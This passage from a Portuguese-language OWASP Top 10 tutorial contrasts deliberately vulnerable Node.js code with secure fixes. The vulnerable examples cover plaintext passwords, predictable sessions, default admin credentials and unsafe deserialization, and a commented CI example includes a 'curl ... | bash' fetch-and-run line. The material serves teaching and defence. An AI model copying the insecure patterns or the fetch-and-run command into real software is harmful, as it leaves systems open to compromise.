    // ✅ Ferramentas de segurança
    "npm-audit-resolver": "^3.0.0-7",
    "snyk": "^1.1230.0"
  },
  "scripts": {
    // ✅ Scripts de segurança automatizados
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "snyk:test": "snyk test",
    "snyk:monitor": "snyk monitor",
    "preinstall": "npx npm-force-resolutions"
  },
  // ✅ Force resolutions para dependências transitivas
  "resolutions": {
    "lodash": "^4.17.21",
    "minimist": "^1.2.6"
  }
}

// .npmrc - Configurações de segurança
/*
# ✅ Sempre usar package-lock.json
package-lock=true

# ✅ Ignorar scripts durante instalação (previne malware)
ignore-scripts=true

# ✅ Audit level
audit-level=moderate
*/

// Script de verificação automatizada
// check-dependencies.js
const { execSync } = require('child_process');
const fs = require('fs');

function checkDependencies() {
  console.log('🔍 Verificando vulnerabilidades...\n');
  
  try {
    // ✅ Executa npm audit
    const auditResult = execSync('npm audit --json', { encoding: 'utf8' });
    const audit = JSON.parse(auditResult);
    
    if (audit.metadata.vulnerabilities.total > 0) {
      console.error('❌ Vulnerabilidades encontradas:');
      console.error(`   High: ${audit.metadata.vulnerabilities.high}`);
      console.error(`   Moderate: ${audit.metadata.vulnerabilities.moderate}`);
      console.error(`   Low: ${audit.metadata.vulnerabilities.low}`);
      
      // Falha no CI/CD se houver vulnerabilidades críticas
      if (audit.metadata.vulnerabilities.critical > 0 || 
          audit.metadata.vulnerabilities.high > 0) {
        process.exit(1);
      }
    } else {
      console.log('✅ Nenhuma vulnerabilidade encontrada!');
    }
    
  } catch (error) {
    console.error('❌ Erro ao verificar dependências:', error.message);
    process.exit(1);
  }
  
  // ✅ Verifica pacotes desatualizados
  try {
    console.log('\n🔍 Verificando pacotes desatualizados...\n');
    execSync('npm outdated', { stdio: 'inherit' });
  } catch (error) {
    // npm outdated retorna exit code 1 se houver pacotes desatualizados
    console.log('\n⚠️  Há pacotes desatualizados. Execute: npm update');
  }
}

// ✅ Verifica integridade dos pacotes
function verifyPackageIntegrity() {
  const packageLock = JSON.parse(
    fs.readFileSync('package-lock.json', 'utf8')
  );
  
  // Verifica se está usando SHA-512 (não SHA-1)
  for (const [name, pkg] of Object.entries(packageLock.packages)) {
    if (pkg.integrity && pkg.integrity.startsWith('sha1-')) {
      console.error(`❌ ${name} usa SHA-1 (fraco). Atualize para SHA-512!`);
      process.exit(1);
    }
  }
  
  console.log('✅ Integridade dos pacotes verificada!');
}

if (require.main === module) {
  checkDependencies();
  verifyPackageIntegrity();
}

module.exports = { checkDependencies, verifyPackageIntegrity };

// Uso correto de lodash (prevenindo Prototype Pollution)
const _ = require('lodash');

app.post('/update-settings', (req, res) => {
  const userSettings = {};
  
  // ✅ Cria objeto sem prototype
  const safeObject = Object.create(null);
  
  // ✅ Lista branca de propriedades permitidas
  const allowedKeys = ['theme', 'language', 'notifications'];
  
  for (const key of allowedKeys) {
    if (req.body[key] !== undefined) {
      safeObject[key] = req.body[key];
    }
  }
  
  // ✅ Usa Object.assign ao invés de _.merge para shallow copy
  Object.assign(userSettings, safeObject);
  
  res.json(userSettings);
});

// GitHub Actions - Verificação automática de segurança
// .github/workflows/security.yml
/*
name: Security Check

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      
      - name: Run Snyk test
        run: npx snyk test --severity-threshold=high
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      - name: Check for outdated packages
        run: npm outdated || true
*/
```

### 🛡️ Como Prevenir

1. **Remova dependências não usadas**: Reduza a superfície de ataque
2. **Use apenas fontes oficiais**: npm, yarn oficial
3. **Monitore vulnerabilidades**: Snyk, npm audit, Dependabot
4. **Mantenha atualizado**: Atualize regularmente
5. **Use package-lock.json**: Garante instalações determinísticas
6. **Verifique integridade**: Use checksums (SHA-512)
7. **Automatize verificações**: CI/CD pipelines
8. **Analise dependências transitivas**: npm ls, yarn why

---

## 7. Identification and Authentication Failures

### 🎭 Explicação Lúdica

Falhas de Autenticação é como ter um porteiro que aceita qualquer documento como identificação válida - até uma carteirinha de biblioteca! Ou pior: o porteiro anota sua senha em um post-it e cola na porta. Autenticação fraca é deixar a porta dos fundos escancarada enquanto você reforça a porta da frente.

### 🎯 O que é?

Identification and Authentication Failures (anteriormente "Broken Authentication") ocorre quando funções relacionadas à autenticação e gerenciamento de sessão são implementadas incorretamente, permitindo que atacantes comprometam senhas, chaves, tokens de sessão ou explorem falhas de implementação.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Autenticação Fraca
const express = require('express');
const app = express();

// ERRO 1: Senhas fracas permitidas
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  
  // ❌ Sem validação de força da senha
  // Permite "123456", "password", etc.
  
  const user = {
    username: username,
    password: password // ❌ Armazena senha em texto plano
  };
  
  await database.saveUser(user);
  res.json({ message: 'Usuário criado' });
});

// ERRO 2: Sem proteção contra brute force
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await database.findUser(username);
  
  // ❌ Permite tentativas ilimitadas
  if (user && user.password === password) {
    // ❌ Token de sessão previsível
    const sessionId = username + Date.now();
    
    res.json({ sessionId: sessionId });
  } else {
    res.status(401).json({ error: 'Login falhou' });
  }
});

// ERRO 3: Sessão não expira
app.get('/profile', (req, res) => {
  const sessionId = req.headers['session-id'];
  
  // ❌ Sem validação de expiração
  // ❌ Sem rotação de token após login
  
  const user = sessions.get(sessionId);
  res.json(user);
});

// ERRO 4: Recuperação de senha insegura
app.post('/reset-password', async (req, res) => {
  const { username, securityQuestion, answer } = req.body;
  
  const user = await database.findUser(username);
  
  // ❌ Pergunta de segurança previsível
  if (user.securityAnswer === answer) {
    // ❌ Permite definir nova senha sem validação adicional
    user.password = req.body.newPassword;
    await database.updateUser(user);
  }
  
  res.json({ message: 'Senha atualizada' });
});

// ERRO 5: Credenciais padrão não alteradas
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'admin123'; // ❌ Senha padrão nunca alterada
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Autenticação Robusta
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const passwordValidator = require('owasp-password-strength-test');
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

const app = express();

// Configurações
const SALT_ROUNDS = 12;
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// Solução 1: Validação forte de senhas
passwordValidator.config({
  allowPassphrases: true,
  maxLength: 128,
  minLength: 10,
  minPhraseLength: 20,
  minOptionalTestsToPass: 4,
});

app.post('/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    // ✅ Valida força da senha
    const passwordTest = passwordValidator.test(password);
    
    if (!passwordTest.strong) {
      return res.status(400).json({
        error: 'Senha fraca',
        requirements: passwordTest.errors
      });
    }
    
    // ✅ Verifica se usuário já existe
    const existingUser = await database.findUser(username);
    if (existingUser) {
      return res.status(400).json({ error: 'Usuário já existe' });
    }
    
    // ✅ Hash seguro da senha
    const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
    
    // ✅ Gera secret para 2FA
    const secret = speakeasy.generateSecret({
      name: `MyApp (${username})`
    });
    
    const user = {
      username: username,
      email: email,
      password: hashedPassword,
      twoFactorSecret: secret.base32,
      twoFactorEnabled: false,
      accountLocked: false,
      loginAttempts: 0,
      createdAt: new Date()
    };
    
    await database.saveUser(user);
    
    // ✅ Gera QR Code para configuração do 2FA
    const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
    
    res.json({
      message: 'Usuário criado com sucesso',
      twoFactorQRCode: qrCodeUrl,
      twoFactorSecret: secret.base32
    });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro no registro' });
  }
});

// Solução 2: Login com proteção contra brute force
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5,
  skipSuccessfulRequests: true,
  message: 'Muitas tentativas de login. Tente novamente em 15 minutos.'
});

app.post('/login', loginLimiter, async (req, res) => {
  try {
    const { username, password, twoFactorCode } = req.body;
    const ip = req.ip;
    
    const user = await database.findUser(username);
    
    if (!user) {
      // ✅ Mesma mensagem para usuário inexistente
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    // ✅ Verifica se conta está bloqueada
    if (user.accountLocked) {
      const lockTime = 30 * 60 * 1000; // 30 minutos
      const timeSinceLock = Date.now() - user.lastFailedLogin.getTime();
      
      if (timeSinceLock < lockTime) {
        return res.status(423).json({
          error: 'Conta temporariamente bloqueada',
          remainingTime: Math.ceil((lockTime - timeSinceLock) / 1000)
        });
      } else {
        // Desbloqueia após o tempo
        user.accountLocked = false;
        user.loginAttempts = 0;
      }
    }
    
    // ✅ Verifica senha com bcrypt
    const isValidPassword = await bcrypt.compare(password, user.password);
    
    if (!isValidPassword) {
      // ✅ Incrementa tentativas falhas
      user.loginAttempts += 1;
      user.lastFailedLogin = new Date();
      
      // ✅ Bloqueia após 5 tentativas
      if (user.loginAttempts >= 5) {
        user.accountLocked = true;
      }
      
      await database.updateUser(user);
      
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    // ✅ Verifica 2FA se habilitado
    if (user.twoFactorEnabled) {
      if (!twoFactorCode) {
        return res.status(401).json({
          error: 'Código 2FA necessário',
          requires2FA: true
        });
      }
      
      const verified = speakeasy.totp.verify({
        secret: user.twoFactorSecret,
        encoding: 'base32',
        token: twoFactorCode,
        window: 2 // Permite 2 códigos anteriores/posteriores
      });
      
      if (!verified) {
        return res.status(401).json({ error: 'Código 2FA inválido' });
      }
    }
    
    // ✅ Reset tentativas após sucesso
    user.loginAttempts = 0;
    user.accountLocked = false;
    user.lastLogin = new Date();
    user.lastLoginIp = ip;
    await database.updateUser(user);
    
    // ✅ Gera tokens JWT seguros
    const accessToken = jwt.sign(
      { 
        id: user.id,
        username: user.username,
        type: 'access'
      },
      JWT_SECRET,
      { expiresIn: '15m' } // Token de acesso expira rápido
    );
    
    const refreshToken = jwt.sign(
      {
        id: user.id,
        type: 'refresh'
      },
      JWT_REFRESH_SECRET,
      { expiresIn: '7d' } // Refresh token dura mais
    );
    
    // ✅ Armazena refresh token hasheado
    const hashedRefreshToken = await bcrypt.hash(refreshToken, 10);
    await database.saveRefreshToken(user.id, hashedRefreshToken);
    
    // ✅ Cookies seguros
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 dias
    });
    
    res.json({
      accessToken: accessToken,
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro no login' });
  }
});

// Solução 3: Sessão com expiração e rotação
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Token não fornecido' });
  }
  
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ error: 'Token expirado' });
      }
      return res.status(403).json({ error: 'Token inválido' });
    }
    
    req.user = user;
    next();
  });
}

// Renovação de token
app.post('/refresh-token', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token não fornecido' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);
    
    // ✅ Verifica se o refresh token está na lista de tokens válidos
    const isValidToken = await database.verifyRefreshToken(
      decoded.id,
      refreshToken
    );
    
    if (!isValidToken) {
      return res.status(403).json({ error: 'Refresh token inválido' });
    }
    
    // ✅ Gera novo access token
    const newAccessToken = jwt.sign(
      {
        id: decoded.id,
        type: 'access'
      },
      JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken: newAccessToken });
    
  } catch (error) {
    res.status(403).json({ error: 'Refresh token inválido' });
  }
});

// Logout seguro
app.post('/logout', authenticateToken, async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  // ✅ Invalida o refresh token
  await database.deleteRefreshToken(req.user.id, refreshToken);
  
  // ✅ Limpa o cookie
  res.clearCookie('refreshToken');
  
  res.json({ message: 'Logout realizado com sucesso' });
});

// Solução 4: Recuperação de senha segura
app.post('/forgot-password', rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 3
}), async (req, res) => {
  const { email } = req.body;
  
  const user = await database.findUserByEmail(email);
  
  // ✅ Sempre retorna a mesma mensagem
  const message = 'Se o email existir, você receberá instruções';
  
  if (user) {
    // ✅ Gera token criptográfico seguro
    const resetToken = require('crypto').randomBytes(32).toString('hex');
    const hashedToken = await bcrypt.hash(resetToken, 10);
    
    await database.savePasswordResetToken(user.id, hashedToken, {
      expiresAt: Date.now() + 3600000 // 1 hora
    });
    
    const resetUrl = `https://example.com/reset-password?token=${resetToken}`;
    await sendEmail(email, `Reset de senha: ${resetUrl}`);
  }
  
  res.json({ message });
});

// Habilitar 2FA
app.post('/enable-2fa', authenticateToken, async (req, res) => {
  const { twoFactorCode } = req.body;
  
  const user = await database.findUserById(req.user.id);
  
  // ✅ Verifica se o código está correto antes de habilitar
  const verified = speakeasy.totp.verify({
    secret: user.twoFactorSecret,
    encoding: 'base32',
    token: twoFactorCode,
    window: 2
  });
  
  if (!verified) {
    return res.status(400).json({ error: 'Código inválido' });
  }
  
  user.twoFactorEnabled = true;
  await database.updateUser(user);
  
  res.json({ message: '2FA habilitado com sucesso' });
});
```

### 🛡️ Como Prevenir

1. **Implemente MFA/2FA**: Autenticação de dois fatores
2. **Senhas fortes**: Use OWASP password strength test
3. **Proteção brute force**: Rate limiting e bloqueio de conta
4. **Hashing seguro**: bcrypt, scrypt ou Argon2
5. **Sessões seguras**: Tokens JWT com expiração curta
6. **Rotação de tokens**: Após login e ações críticas
7. **HTTPS obrigatório**: Para todas as comunicações
8. **Sem credenciais padrão**: Force mudança no primeiro uso

---

## 8. Software and Data Integrity Failures

### 🎭 Explicação Lúdica

Software and Data Integrity Failures é como baixar um aplicativo de uma loja não oficial - você não sabe se o que está instalando é realmente o aplicativo original ou uma versão modificada com malware. Ou confiar em um plugin sem verificar sua procedência, só para descobrir que ele está enviando seus dados para hackers.

### 🎯 O que é?

Software and Data Integrity Failures relaciona-se a código e infraestrutura que não protege contra violações de integridade. Isso inclui usar bibliotecas de fontes não confiáveis, pipelines CI/CD inseguros, e desserialização insegura de dados.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Falhas de Integridade

// ERRO 1: Carregar biblioteca de CDN não confiável
// HTML
/*
<script src="https://random-cdn.com/library.js"></script>
❌ Sem verificação de integridade
❌ CDN pode ser comprometido
❌ Código pode mudar sem aviso
*/

// ERRO 2: Desserialização insegura
const express = require('express');
const app = express();

app.post('/api/update', (req, res) => {
  // ❌ Aceita dados serializados sem validação
  const userData = JSON.parse(req.body.data);
  
  // ❌ Permite modificação de propriedades críticas
  if (userData.__proto__) {
    // Prototype Pollution Attack!
    Object.assign({}, userData);
  }
  
  res.json({ updated: true });
});

// ERRO 3: Instalar pacotes npm sem verificação
/*
npm install some-package
❌ Não verifica assinatura
❌ Não verifica checksum
❌ Não verifica fonte
*/

// ERRO 4: Auto-update sem verificação
function autoUpdate() {
  // ❌ Baixa update sem verificar assinatura
  fetch('https://updates.example.com/latest.zip')
    .then(response => response.blob())
    .then(blob => {
      // ❌ Instala diretamente sem verificação
      installUpdate(blob);
    });
}

// ERRO 5: CI/CD inseguro
// .github/workflows/deploy.yml
/*
❌ Código vulnerável
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      # ❌ Sem verificação de integridade
      - run: curl https://deploy-script.com/install.sh | bash
      
      # ❌ Credenciais em texto plano
      - run: aws deploy --key AKIAIOSFODNN7EXAMPLE
*/
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Integridade Garantida

// Solução 1: Subresource Integrity (SRI) para CDNs
// HTML
/*
<script 
  src="https://cdn.example.com/library@1.2.3/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

✅ Verifica hash SHA-384 antes de executar
✅ Impede modificações maliciosas
✅ Crossorigin para CORS correto
*/

// Solução 2: Desserialização segura com validação
const express = require('express');
const Joi = require('joi');
const app = express();

// ✅ Define schema de validação
const userSchema = Joi.object({
  name: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(18).max(120),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark'),
    notifications: Joi.boolean()
  })
}).unknown(false); // ✅ Rejeita propriedades desconhecidas

app.post('/api/update', async (req, res) => {
  try {
    // ✅ Valida dados antes de usar
    const { error, value } = userSchema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true // ✅ Remove propriedades não definidas
    });
    
    if (error) {
      return res.status(400).json({
        error: 'Dados inválidos',
        details: error.details.map(d => d.message)
      });
    }
    
    // ✅ Usa objeto sem prototype para evitar pollution
    const safeData = Object.create(null);
    Object.assign(safeData, value);
    
    // ✅ Validação adicional de integridade
    const checksum = calculateChecksum(safeData);
    if (req.body.checksum !== checksum) {
      return res.status(400).json({ error: 'Checksum inválido' });
    }
    
    await database.updateUser(req.user.id, safeData);
    
    res.json({ updated: true });
    
  } catch (error) {
    res.status(500).json({ error: 'Erro na atualização' });
  }
});

// Função para calcular checksum
const crypto = require('crypto');

function calculateChecksum(data) {
  const json = JSON.stringify(data, Object.keys(data).sort());
  return crypto.createHash('sha256').update(json).digest('hex');
}

// Solução 3: Verificação de integridade de pacotes npm
// package.json
/*
{
  "scripts": {
    "preinstall": "node scripts/verify-packages.js",
    "postinstall": "npm audit --audit-level=moderate"
  }
}
*/

// scripts/verify-packages.js
const fs = require('fs');
const crypto = require('crypto');

function verifyPackageIntegrity() {
  console.log('🔍 Verificando integridade dos pacotes...\n');
  
  // ✅ Verifica se package-lock.json existe
  if (!fs.existsSync('package-lock.json')) {
    console.error('❌ package-lock.json não encontrado!');
    process.exit(1);
  }
  
  const packageLock = JSON.parse(
    fs.readFileSync('package-lock.json', 'utf8')
  );
  
  // ✅ Verifica algoritmo de hash
  for (const [name, pkg] of Object.entries(packageLock.packages)) {
    if (!pkg.integrity) continue;
    
    // ❌ SHA-1 é vulnerável a colisões
    if (pkg.integrity.startsWith('sha1-')) {
      console.error(`❌ ${name} usa SHA-1 (inseguro)`);
      process.exit(1);
    }
    
    // ✅ SHA-512 é recomendado
    if (!pkg.integrity.startsWith('sha512-')) {
      console.warn(`⚠️  ${name} não usa SHA-512`);
    }
  }
  
  // ✅ Verifica lista de pacotes permitidos
  const allowedPackages = JSON.parse(
    fs.readFileSync('allowed-packages.json', 'utf8')
  );
  
  for (const [name, pkg] of Object.entries(packageLock.packages)) {
    if (name === '') continue; // Root package
    
    const pkgName = name.replace(/^node_modules\//, '');
    const allowed = allowedPackages[pkgName];
    
    if (!allowed) {
      console.error(`❌ Pacote não autorizado: ${pkgName}`);
      process.exit(1);
    }
    
    // ✅ Verifica se a versão é permitida
    if (allowed.versions && !allowed.versions.includes(pkg.version)) {
      console.error(`❌ Versão não autorizada: ${pkgName}@${pkg.version}`);
      process.exit(1);
    }
  }
  
  console.log('✅ Integridade verificada!\n');
}

if (require.main === module) {
  verifyPackageIntegrity();
}

// Solução 4: Auto-update seguro com assinatura digital
const crypto = require('crypto');
const fs = require('fs');
const https = require('https');

async function secureAutoUpdate() {
  const UPDATE_URL = 'https://updates.example.com/latest.json';
  const PUBLIC_KEY = fs.readFileSync('public-key.pem', 'utf8');
  
  try {
    // ✅ 1. Busca informações da atualização
    const updateInfo = await fetchJSON(UPDATE_URL);
    
    // ✅ 2. Verifica assinatura digital
    const isValidSignature = crypto.verify(
      'sha256',
      Buffer.from(updateInfo.checksum),
      {
        key: PUBLIC_KEY,
        padding: crypto.constants.RSA_PKCS1_PSS_PADDING,
      },
      Buffer.from(updateInfo.signature, 'base64')
    );
    
    if (!isValidSignature) {
      throw new Error('Assinatura digital inválida');
    }
    
    console.log('✅ Assinatura verificada');
    
    // ✅ 3. Baixa o arquivo da atualização
    const updateFile = await downloadFile(updateInfo.downloadUrl);
    
    // ✅ 4. Verifica checksum
    const fileChecksum = crypto
      .createHash('sha256')
      .update(updateFile)
      .digest('hex');
    
    if (fileChecksum !== updateInfo.checksum) {
      throw new Error('Checksum não corresponde');
    }
    
    console.log('✅ Checksum verificado');
    
    // ✅ 5. Verifica versão
    const currentVersion = require('./package.json').version;
    if (!isNewerVersion(updateInfo.version, currentVersion)) {
      console.log('Já está na versão mais recente');
      return;
    }
    
    // ✅ 6. Instala atualização
    await installUpdate(updateFile);
    
    console.log('✅ Atualização instalada com sucesso');
    
  } catch (error) {
    console.error('❌ Erro na atualização:', error.message);
  }
}

function isNewerVersion(newVer, currentVer) {
  const newParts = newVer.split('.').map(Number);
  const currentParts = currentVer.split('.').map(Number);
  
  for (let i = 0; i < 3; i++) {
    if (newParts[i] > currentParts[i]) return true;
    if (newParts[i] < currentParts[i]) return false;
  }
  
  return false;
}

// Solução 5: CI/CD Seguro
// .github/workflows/secure-deploy.yml
/*
name: Secure Deploy

on:
  push:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          persist-credentials: false # ✅ Não persiste credenciais
      
      # ✅ Verifica assinatura de commits
      - name: Verify commit signature
        run: |
          git verify-commit HEAD || exit 1
      
      # ✅ Escaneia vulnerabilidades
      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      # ✅ Verifica integridade de dependências
      - name: Verify dependencies
        run: |
          npm ci
          npm audit --audit-level=high
          node scripts/verify-packages.js
  
  build:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # ✅ Usa actions confiáveis com versão específica
      - name: Setup Node.js
        uses: actions/setup-node@v3.5.1
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci --ignore-scripts # ✅ Ignora scripts de instalação
      
      - name: Build
        run: npm run build
      
      # ✅ Gera checksum do build
      - name: Generate build checksum
        run: |
          sha256sum dist/* > dist/checksums.txt
      
      # ✅ Assina o build
      - name: Sign build
        run: |
          echo "${{ secrets.SIGNING_KEY }}" | base64 -d > private-key.pem
          openssl dgst -sha256 -sign private-key.pem -out dist/signature.sig dist/checksums.txt
          rm private-key.pem
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build
          path: dist/
  
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment: production # ✅ Requer aprovação manual
    steps:
      - name: Download artifacts
        uses: actions/download-artifact@v3
      
      # ✅ Verifica assinatura antes de deploy
      - name: Verify build signature
        run: |
          echo "${{ secrets.PUBLIC_KEY }}" > public-key.pem
          openssl dgst -sha256 -verify public-key.pem -signature dist/signature.sig dist/checksums.txt
          sha256sum -c dist/checksums.txt
      
      # ✅ Deploy usando credenciais seguras do GitHub Secrets
      - name: Deploy to production
        run: |
          # Deploy code here
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
*/
```

### 🛡️ Como Prevenir

1. **Use assinaturas digitais**: Para atualizações e pacotes
2. **Verifique checksums**: SHA-256 ou superior
3. **Subresource Integrity (SRI)**: Para recursos externos
4. **Valide desserialização**: Schemas e whitelist
5. **Pipeline CI/CD seguro**: Verificações em cada etapa
6. **Fontes confiáveis**: Apenas registros oficiais
7. **Package-lock.json**: Instalações determinísticas
8. **Code signing**: Assine seu código

---

## 9. Security Logging and Monitoring Failures

### 🎭 Explicação Lúdica

Falhas de Log e Monitoramento é como ter câmeras de segurança que não gravam nada ou que ninguém nunca assiste. Quando algo ruim acontece, você não tem evidências de quem foi, quando aconteceu ou o que fizeram. É deixar o ladrão agir sem testemunhas e sem rastros!

### 🎯 O que é?

Security Logging and Monitoring Failures ocorre quando não há logs adequados de eventos de segurança, ou quando os logs existem mas não são monitorados. Isso impede a detecção de brechas e aumenta o tempo de resposta a incidentes.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - Logging Insuficiente
const express = require('express');
const app = express();

// ERRO 1: Sem logging de tentativas de login
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await database.findUser(username);
  
  if (user && user.password === password) {
    // ❌ Sem log de login bem-sucedido
    return res.json({ success: true });
  }
  
  // ❌ Sem log de tentativa falhada
  res.status(401).json({ error: 'Login falhou' });
});

// ERRO 2: Logs com informações sensíveis
app.post('/update-profile', (req, res) => {
  // ❌ Loga dados sensíveis
  console.log('Profile update:', JSON.stringify(req.body));
  // Isso pode incluir: passwords, SSN, credit cards, etc.
  
  res.json({ updated: true });
});

// ERRO 3: Erros silenciosos
app.get('/api/data', async (req, res) => {
  try {
    const data = await fetchData();
    res.json(data);
  } catch (error) {
    // ❌ Erro engolido sem log
    res.status(500).json({ error: 'Erro' });
  }
});

// ERRO 4: Sem logs de eventos críticos
app.delete('/api/user/:id', (req, res) => {
  // ❌ Sem log de quem deletou
  // ❌ Sem log de quando deletou
  // ❌ Sem log do IP de origem
  
  database.deleteUser(req.params.id);
  res.json({ deleted: true });
});

// ERRO 5: Sem monitoramento de anomalias
// ❌ Não detecta múltiplas tentativas de login
// ❌ Não detecta acessos de IPs suspeitos
// ❌ Não detecta mudanças de padrão de uso
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Logging e Monitoramento Completo
const express = require('express');
const winston = require('winston');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();

// Solução 1: Configuração de logging estruturado
const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp({
      format: 'YYYY-MM-DD HH:mm:ss'
    }),
    winston.format.errors({ stack: true }),
    winston.format.splat(),
    winston.format.json()
  ),
  defaultMeta: { 
    service: 'user-service',
    environment: process.env.NODE_ENV
  },
  transports: [
    // ✅ Logs de erro em arquivo separado
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error',
      maxsize: 5242880, // 5MB
      maxFiles: 5,
    }),
    
    // ✅ Logs de segurança em arquivo separado
    new winston.transports.File({ 
      filename: 'logs/security.log',
      level: 'warn'
    }),
    
    // ✅ Todos os logs
    new winston.transports.File({ 
      filename: 'logs/combined.log',
      maxsize: 5242880,
      maxFiles: 5,
    })
  ]
});

// Console em desenvolvimento
if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.combine(
      winston.format.colorize(),
      winston.format.simple()
    )
  }));
}

// Solução 2: Middleware de logging de requisições
app.use(morgan('combined', {
  stream: {
    write: (message) => logger.info(message.trim())
  }
}));

// Middleware para adicionar request ID único
const { v4: uuidv4 } = require('uuid');

app.use((req, res, next) => {
  req.id = uuidv4();
  res.setHeader('X-Request-ID', req.id);
  next();
});

// Solução 3: Logging de autenticação completo
const loginAttempts = new Map();

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.ip;
  const userAgent = req.get('user-agent');
  const requestId = req.id;
  
  // ✅ Log de tentativa de login (sem senha!)
  logger.info('Login attempt', {
    username: username,
    ip: ip,
    userAgent: userAgent,
    requestId: requestId,
    timestamp: new Date().toISOString()
  });
  
  const user = await database.findUser(username);
  const bcrypt = require('bcrypt');
  
  if (!user || !(await bcrypt.compare(password, user.password))) {
    // ✅ Log detalhado de falha
    logger.warn('Login failed', {
      username: username,
      ip: ip,
      userAgent: userAgent,
      reason: !user ? 'user_not_found' : 'invalid_password',
      requestId: requestId
    });
    
    // ✅ Rastreia tentativas por IP
    const attempts = loginAttempts.get(ip) || [];
    attempts.push({
      username: username,
      timestamp: Date.now()
    });
    loginAttempts.set(ip, attempts);
    
    // ✅ Alerta se muitas tentativas
    if (attempts.length >= 5) {
      logger.error('Potential brute force attack detected', {
        ip: ip,
        attempts: attempts.length,
        usernames: attempts.map(a => a.username),
        timeWindow: '5 minutes'
      });
      
      // Envia alerta
      await sendSecurityAlert('Brute force attack', { ip, attempts });
    }
    
    return res.status(401).json({ error: 'Credenciais inválidas' });
  }
  
  // ✅ Log de sucesso
  logger.info('Login successful', {
    userId: user.id,
    username: username,
    ip: ip,
    userAgent: userAgent,
    requestId: requestId
  });
  
  // ✅ Limpa tentativas após sucesso
  loginAttempts.delete(ip);
  
  // ✅ Detecta login de nova localização
  if (user.lastLoginIp && user.lastLoginIp !== ip) {
    logger.warn('Login from new IP address', {
      userId: user.id,
      username: username,
      previousIp: user.lastLoginIp,
      newIp: ip
    });
    
    // Notifica usuário
    await sendEmail(user.email, 'Novo login detectado');
  }
  
  // Atualiza último login
  await database.updateUser(user.id, {
    lastLogin: new Date(),
    lastLoginIp: ip
  });
  
  res.json({ success: true });
});

// Solução 4: Logging de operações críticas
function auditLog(action, details) {
  logger.info('Security audit', {
    action: action,
    ...details,
    timestamp: new Date().toISOString()
  });
}

app.delete('/api/user/:id', authenticateToken, async (req, res) => {
  const targetUserId = req.params.id;
  const actorUserId = req.user.id;
  
  try {
    // ✅ Verifica permissão
    if (!await hasPermission(actorUserId, 'delete_user')) {
